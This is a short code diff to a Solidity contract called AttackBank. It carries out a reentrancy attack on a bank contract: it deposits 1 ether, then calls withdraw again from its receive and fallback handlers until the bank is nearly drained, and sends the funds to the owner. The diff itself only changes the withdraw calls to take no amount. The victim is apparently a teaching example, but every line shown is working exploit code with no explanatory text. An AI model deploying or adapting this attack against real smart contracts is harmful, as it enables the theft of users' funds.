@@ -3,7 +3,7 @@ pragma solidity ^0.8.15;
 
 interface Bank_V1 {
     function deposit() external payable;
-    function withdraw(uint256 amount) external;
+    function withdraw() external;
 }
 
 contract AttackBank {
@@ -17,12 +17,12 @@ contract AttackBank {
 
     function attack() external payable {
         bankv1.deposit{value: 1 ether}();
-        bankv1.withdraw(1 ether);
+        bankv1.withdraw();
     }
 
     receive() external payable {
         if (address(bankv1).balance > 1 ether) {
-            bankv1.withdraw(1 ether);
+            bankv1.withdraw();
         } else {
             payable(owner).transfer(address(this).balance);
         }
@@ -30,7 +30,7 @@ contract AttackBank {
 
     fallback() external payable {
         if (address(bankv1).balance > 1 ether) {
-            bankv1.withdraw(1 ether);
+            bankv1.withdraw();
         } else {
             payable(owner).transfer(address(this).balance);
         }
